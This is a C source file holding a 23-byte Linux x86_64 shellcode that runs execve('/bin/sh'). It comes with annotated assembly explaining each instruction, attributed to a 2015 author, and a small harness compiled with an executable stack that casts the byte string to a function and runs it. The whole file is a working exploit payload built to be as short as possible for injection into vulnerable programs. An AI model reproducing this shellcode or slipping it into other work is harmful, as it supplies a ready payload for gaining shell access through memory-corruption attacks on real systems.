/*
    #
    # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes)
    #
    # Dying to be the shortest.
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 27 April 2015
    #
    # GPL
    #


    .global _start
_start:
    # char *const argv[]
    xorl %esi, %esi

    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'
    movq $0x68732f2f6e69622f, %rbx

    # for '\x00'
    pushq %rsi

    pushq %rbx

    pushq %rsp
    # const char *filename
    popq %rdi

    # __NR_execve 59
    pushq $59
    popq %rax

    # char *const envp[]
    xorl %edx, %edx

    syscall
 */

/*
  gcc -z execstack push64.c

  uname -r
  3.19.3-3-ARCH
 */

#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}